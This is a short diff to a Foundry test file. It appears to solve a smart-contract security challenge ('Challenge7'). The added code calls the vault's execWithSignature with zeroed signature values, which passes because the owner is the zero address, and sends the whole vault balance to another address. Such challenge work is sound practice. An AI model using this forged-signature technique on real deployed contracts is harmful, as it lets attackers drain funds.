@@ -45,9 +45,16 @@ contract Challenge7Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
+        console.log("Vault owner: ", DaoVaultImplementation(payable(address(vault))).owner()); // 0x0000000000000000000000000000000000000000
+        vault.execWithSignature(
+            0, // v
+            0, // r
+            0, // s
+            address(daoManager), // target
+            address(vault).balance, // val
+            "", // execOrder
+            block.timestamp + 3 days
+        );
 
         //==================================================//
         vm.stopPrank();
